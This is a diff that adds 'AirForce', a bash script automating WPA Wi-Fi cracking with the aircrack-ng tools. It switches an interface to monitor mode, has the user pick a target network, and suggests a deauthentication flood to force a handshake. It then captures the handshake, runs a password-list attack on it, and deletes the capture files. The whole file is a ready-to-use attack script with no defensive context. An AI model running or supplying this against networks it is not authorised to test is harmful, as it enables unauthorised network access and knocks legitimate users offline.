@@ -1,0 +1,43 @@
+#! /bin/bash
+
+#Check if Parameters are set
+if [ "$2" = "" ]; then
+  echo "Use: airforce INTERFACE PATH/TO/PASSWORDLIST"
+  exit
+fi
+
+echo "Welcome to AirForce!"
+echo ""
+echo "Setting up interfaces"
+sudo systemctl stop NetworkManager.service
+sudo killall wpa-supplicant
+sudo airmon-ng start $1
+
+echo "Starting dump"
+sudo airodump-ng $1mon
+
+echo "Please choose target BSSID: "
+read target
+echo "please choose target channel"
+read channel
+
+echo "To speed things up run: 'aireplay-ng --deauth 100 -a $target $1mon --ignore-negative-one' in another terminal ;D"
+read -n 1 -s -p "Press any key to continue"
+
+airodump-ng -c $channel --bssid $target -w WPAcrack $1mon --ignore-negative-one
+
+echo "Start cracking!"
+sudo aircrack-ng -w $2 -b $target WPAcrack-01.cap
+
+echo "Restoring interfaces"
+sudo systemctl start NetworkManager.service
+sudo airmon-ng stop $1mon
+
+echo "[ALERT!] Cleaning up will eraze your AirCrack files!"
+read -n 1 -s -p "Press any key to clean up"
+sudo rm -rf WPAcrack*.kismet.netxml
+sudo rm -rf WPAcrack*.kismet.csv
+sudo rm -rf WPAcrack*.csv
+sudo rm -rf WPAcrack*.cap
+
+echo "ready."
